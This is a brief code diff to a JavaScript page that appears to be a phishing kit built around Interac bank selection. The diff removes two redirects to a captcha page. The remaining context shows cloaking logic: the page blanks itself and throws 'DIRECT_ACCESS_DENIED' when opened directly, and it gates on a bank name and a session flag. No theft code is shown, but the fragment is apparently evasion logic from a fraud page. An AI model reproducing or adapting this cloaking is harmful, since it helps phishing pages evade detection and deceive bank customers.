@@ -73,7 +73,7 @@
       try {
         _D.documentElement.innerHTML = '';
       } catch(e){}
-      _W.location.replace('/captcha.html');
+      
       throw new Error('DIRECT_ACCESS_DENIED');
     }
   }
@@ -219,7 +219,7 @@
         if (!_finalBankName || _finalBankName.length < 2 || _finalBankName.indexOf('INTERAC') !== -1 || _finalBankName.indexOf('Help') !== -1) return;
 
         if (!_W.sessionStorage.getItem('__cptPass') || _W.sessionStorage.getItem('__cptPass') !== '1') {
-          _W.location.replace('captcha.html');
+          
           return;
         }
 
